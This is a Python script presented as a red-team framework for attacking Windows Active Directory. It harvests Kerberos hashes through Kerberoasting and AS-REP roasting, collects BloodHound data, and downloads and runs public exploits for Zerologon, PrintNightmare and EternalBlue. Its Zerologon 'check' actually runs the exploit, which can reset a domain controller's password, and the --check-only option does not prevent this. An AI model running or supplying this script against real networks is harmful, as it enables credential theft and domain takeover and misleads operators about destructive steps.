#!/usr/bin/env python3
"""
Windows Active Directory Attack Script for Red Team Assessment
"""

import os
import sys
import argparse
import subprocess
import socket
import time
from datetime import datetime

def check_and_install_dependencies():
    """Install required dependencies for the script."""
    required_packages = [
        "impacket", "ldap3", "requests", "colorama", "pycryptodomex"
    ]
    
    print("[*] Checking and installing dependencies...")
    
    try:
        # Check if pip is installed
        subprocess.check_call([sys.executable, "-m", "pip", "--version"], 
                              stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    except subprocess.CalledProcessError:
        print("[!] pip is not installed. Installing pip...")
        subprocess.check_call(["apt-get", "update"])
        subprocess.check_call(["apt-get", "install", "-y", "python3-pip"])
    
    # Install required packages
    for package in required_packages:
        try:
            print(f"[*] Checking {package}...")
            __import__(package)
            print(f"[+] {package} is already installed.")
        except ImportError:
            print(f"[!] {package} not found. Installing...")
            subprocess.check_call([sys.executable, "-m", "pip", "install", package])
    
    # Install additional tools
    try:
        subprocess.check_call(["which", "enum4linux"], 
                             stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        print("[+] enum4linux is already installed.")
    except subprocess.CalledProcessError:
        print("[!] Installing enum4linux...")
        subprocess.check_call(["apt-get", "update"])
        subprocess.check_call(["apt-get", "install", "-y", "enum4linux"])

    # Install bloodhound
    try:
        subprocess.check_call(["which", "bloodhound-python"], 
                             stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        print("[+] BloodHound Python is already installed.")
    except subprocess.CalledProcessError:
        print("[!] Installing BloodHound Python...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", "bloodhound"])
    
    print("[+] All dependencies installed successfully.")

def log_activity(message):
    """Log all activities with timestamp."""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open("ad_attack.log", "a") as f:
        f.write(f"[{timestamp}] {message}\n")
    print(f"[{timestamp}] {message}")

def check_connectivity(target_ip):
    """Check if the target is reachable."""
    try:
        # Check if host is up (simple ping)
        subprocess.check_call(["ping", "-c", "1", "-W", "2", target_ip], 
                             stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        log_activity(f"Target {target_ip} is reachable.")
        return True
    except subprocess.CalledProcessError:
        log_activity(f"Target {target_ip} is not reachable.")
        return False

def check_open_ports(target_ip):
    """Check for common AD ports."""
    common_ports = {
        53: "DNS",
        88: "Kerberos",
        389: "LDAP",
        445: "SMB",
        636: "LDAPS",
        3268: "Global Catalog",
        3389: "RDP"
    }
    
    open_ports = []
    
    for port, service in common_ports.items():
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex((target_ip, port))
        sock.close()
        
        if result == 0:
            log_activity(f"Port {port} ({service}) is open")
            open_ports.append(port)
        else:
            log_activity(f"Port {port} ({service}) is closed")
    
    return open_ports

def enumerate_smb(target_ip, username=None, password=None, domain=None):
    """Enumerate SMB shares and users."""
    log_activity("Starting SMB enumeration...")
    
    # Run enum4linux
    try:
        cmd = ["enum4linux", "-a", target_ip]
        log_activity(f"Running: {' '.join(cmd)}")
        result = subprocess.run(cmd, capture_output=True, text=True)
        
        # Save output to file
        with open("enum4linux_output.txt", "w") as f:
            f.write(result.stdout)
        
        log_activity("SMB enumeration completed. Results saved to enum4linux_output.txt")
    except Exception as e:
        log_activity(f"SMB enumeration failed: {str(e)}")
    
    # Try to list shares if credentials are provided
    if username and password:
        try:
            cmd = ["smbclient", "-L", target_ip, "-U", f"{username}%{password}"]
            if domain:
                cmd.extend(["-W", domain])
            
            log_activity(f"Running: {' '.join(cmd)}")
            result = subprocess.run(cmd, capture_output=True, text=True)
            
            # Save output to file
            with open("smb_shares.txt", "w") as f:
                f.write(result.stdout)
            
            log_activity("SMB share listing completed. Results saved to smb_shares.txt")
        except Exception as e:
            log_activity(f"SMB share listing failed: {str(e)}")

def kerberoast_attack(target_ip, domain, username=None, password=None):
    """Perform Kerberoasting attack."""
    log_activity("Starting Kerberoasting attack...")
    
    if not domain:
        log_activity("Domain name is required for Kerberoasting attack")
        return
    
    try:
        if username and password:
            # Using provided credentials
            cmd = [
                "impacket-GetUserSPNs", 
                f"{domain}/{username}:{password}",
                "-dc-ip", target_ip,
                "-request"
            ]
        else:
            # Without credentials (might not work)
            cmd = [
                "impacket-GetUserSPNs", 
                domain + "/",
                "-dc-ip", target_ip,
                "-no-pass"
            ]
        
        log_activity(f"Running: {' '.join(cmd)}")
        result = subprocess.run(cmd, capture_output=True, text=True)
        
        # Save output to file
        with open("kerberoast_results.txt", "w") as f:
            f.write(result.stdout)
        
        log_activity("Kerberoasting attack completed. Results saved to kerberoast_results.txt")
    except Exception as e:
        log_activity(f"Kerberoasting attack failed: {str(e)}")

def as_rep_roasting(target_ip, domain, username_file=None):
    """Perform AS-REP Roasting attack."""
    log_activity("Starting AS-REP Roasting attack...")
    
    if not domain:
        log_activity("Domain name is required for AS-REP Roasting attack")
        return
    
    try:
        if username_file and os.path.exists(username_file):
            cmd = [
                "impacket-GetNPUsers",
                domain + "/", 
                "-dc-ip", target_ip,
                "-usersfile", username_file,
                "-format", "hashcat",
                "-outputfile", "asreproast_hashes.txt"
            ]
        else:
            # Without user list
            cmd = [
                "impacket-GetNPUsers",
                domain + "/", 
                "-dc-ip", target_ip,
                "-no-pass",
                "-format", "hashcat",
                "-outputfile", "asreproast_hashes.txt"
            ]
        
        log_activity(f"Running: {' '.join(cmd)}")
        result = subprocess.run(cmd, capture_output=True, text=True)
        
        if os.path.exists("asreproast_hashes.txt") and os.path.getsize("asreproast_hashes.txt") > 0:
            log_activity("AS-REP Roasting attack completed. Hashes saved to asreproast_hashes.txt")
        else:
            log_activity("AS-REP Roasting completed but no hashes were obtained.")
    except Exception as e:
        log_activity(f"AS-REP Roasting attack failed: {str(e)}")

def bloodhound_collection(target_ip, domain, username=None, password=None):
    """Collect data using BloodHound."""
    log_activity("Starting BloodHound data collection...")
    
    if not domain:
        log_activity("Domain name is required for BloodHound data collection")
        return
    
    try:
        if username and password:
            cmd = [
                "bloodhound-python",
                "-c", "all",
                "-d", domain,
                "-u", username,
                "-p", password,
                "--zip",
                "-ns", target_ip
            ]
        else:
            log_activity("BloodHound collection requires credentials, skipping...")
            return
        
        log_activity(f"Running: {' '.join(cmd)}")
        result = subprocess.run(cmd, capture_output=True, text=True)
        
        log_activity("BloodHound data collection completed.")
        log_activity(result.stdout)
    except Exception as e:
        log_activity(f"BloodHound data collection failed: {str(e)}")

def zerologon_check(target_ip, domain=None):
    """Check for Zerologon vulnerability (CVE-2020-1472)."""
    log_activity("Checking for Zerologon vulnerability...")
    
    # First, try to get the DC name
    dc_name = None
    
    if domain:
        try:
            cmd = ["nslookup", "-type=SRV", f"_ldap._tcp.dc._msdcs.{domain}", target_ip]
            result = subprocess.run(cmd, capture_output=True, text=True)
            
            # Parse output to find DC name
            for line in result.stdout.splitlines():
                if "svr hostname" in line.lower():
                    dc_name = line.split("=")[-1].strip()
                    break
            
            if dc_name:
                log_activity(f"Found DC name: {dc_name}")
            else:
                log_activity("Could not determine DC name automatically")
        except Exception as e:
            log_activity(f"Error determining DC name: {str(e)}")
    
    try:
        # Clone the exploit repository if needed
        if not os.path.exists("CVE-2020-1472"):
            subprocess.run(["git", "clone", "https://github.com/dirkjanm/CVE-2020-1472.git"], check=True)
        
        # Run the check
        if dc_name:
            cmd = ["python3", "CVE-2020-1472/cve-2020-1472-exploit.py", dc_name, target_ip]
        else:
            log_activity("No DC name provided, testing with target IP's hostname...")
            cmd = ["python3", "CVE-2020-1472/cve-2020-1472-exploit.py", target_ip, target_ip]
        
        log_activity(f"Running: {' '.join(cmd)}")
        result = subprocess.run(cmd, capture_output=True, text=True)
        
        with open("zerologon_check.txt", "w") as f:
            f.write(result.stdout)
        
        log_activity("Zerologon check completed. Results saved to zerologon_check.txt")
    except Exception as e:
        log_activity(f"Zerologon check failed: {str(e)}")

def printnightmare_check(target_ip, username=None, password=None, domain=None):
    """Check for PrintNightmare vulnerability (CVE-2021-34527)."""
    log_activity("Checking for PrintNightmare vulnerability...")
    
    try:
        # Clone the exploit repository if needed
        if not os.path.exists("CVE-2021-34527"):
            subprocess.run(["git", "clone", "https://github.com/cube0x0/CVE-2021-34527.git"], check=True)
        
        log_activity("PrintNightmare check requires authentication to test properly")
        log_activity("Please test manually with the tool in CVE-2021-34527 directory if you have credentials")
        
        if username and password and domain:
            log_activity(f"You can use: python3 CVE-2021-34527/CVE-2021-34527.py {domain}/{username}:{password}@{target_ip}")
    except Exception as e:
        log_activity(f"PrintNightmare check setup failed: {str(e)}")

def attempt_smb_exploit(target_ip):
    """Attempt to exploit SMB vulnerabilities."""
    log_activity("Attempting SMB exploitation...")
    
    # Check for EternalBlue (MS17-010)
    try:
        # Clone the scanner repository if needed
        if not os.path.exists("MS17-010"):
            subprocess.run(["git", "clone", "https://github.com/3ndG4me/AutoBlue-MS17-010.git", "MS17-010"], check=True)
        
        # Run the scanner
        cmd = ["python3", "MS17-010/eternal_checker.py", target_ip]
        log_activity(f"Running: {' '.join(cmd)}")
        result = subprocess.run(cmd, capture_output=True, text=True)
        
        with open("eternalblue_check.txt", "w") as f:
            f.write(result.stdout)
        
        if "VULNERABLE" in result.stdout:
            log_activity("Target appears VULNERABLE to EternalBlue!")
            log_activity("You can attempt exploitation using the AutoBlue-MS17-010 tools")
        else:
            log_activity("Target does not appear vulnerable to EternalBlue")
    except Exception as e:
        log_activity(f"EternalBlue check failed: {str(e)}")

def main():
    parser = argparse.ArgumentParser(description="Windows Active Directory Attack Script")
    parser.add_argument("-t", "--target", required=True, help="Target IP address")
    parser.add_argument("-d", "--domain", help="Domain name (e.g., contoso.local)")
    parser.add_argument("-u", "--username", help="Username for authentication")
    parser.add_argument("-p", "--password", help="Password for authentication")
    parser.add_argument("-U", "--userlist", help="File containing username list for AS-REP Roasting")
    parser.add_argument("--check-only", action="store_true", help="Only check for vulnerabilities, no exploitation")
    
    args = parser.parse_args()
    
    # Header
    print("""
    ╔═══════════════════════════════════════════════════╗
    ║                                                   ║
    ║           WINDOWS AD ATTACK FRAMEWORK             ║
    ║                                                   ║
    ║             !!! RED TEAM ONLY !!!                 ║
    ║     For authorized assessment purposes only       ║
    ║                                                   ║
    ╚═══════════════════════════════════════════════════╝
    """)
    
    # Check and install dependencies
    check_and_install_dependencies()
    
    # Initial checks
    if not check_connectivity(args.target):
        print(f"[!] Target {args.target} is not reachable. Exiting...")
        sys.exit(1)
        
    # Port scanning
    open_ports = check_open_ports(args.target)
    
    if not open_ports:
        print("[!] No common Active Directory ports are open. Target may not be a Domain Controller.")
        continue_prompt = input("Do you want to continue anyway? (y/n): ")
        if continue_prompt.lower() != 'y':
            sys.exit(1)
    
    # SMB enumeration
    if 445 in open_ports:
        enumerate_smb(args.target, args.username, args.password, args.domain)
        
        # Try SMB exploits
        if not args.check_only:
            attempt_smb_exploit(args.target)
    
    # Authentication-based attacks
    if args.domain:
        # Kerberoasting
        if 88 in open_ports:
            kerberoast_attack(args.target, args.domain, args.username, args.password)
            
            # AS-REP Roasting
            as_rep_roasting(args.target, args.domain, args.userlist)
        
        # BloodHound collection
        if args.username and args.password:
            bloodhound_collection(args.target, args.domain, args.username, args.password)
        
        # Zerologon check
        zerologon_check(args.target, args.domain)
        
        # PrintNightmare check
        printnightmare_check(args.target, args.username, args.password, args.domain)

    print("""
    ╔═══════════════════════════════════════════════════╗
    ║                                                   ║
    ║             ASSESSMENT COMPLETED                  ║
    ║                                                   ║
    ║      Check the generated output files for         ║
    ║      detailed results and next steps              ║
    ║                                                   ║
    ╚═══════════════════════════════════════════════════╝
    """)

if __name__ == "__main__":
    main()
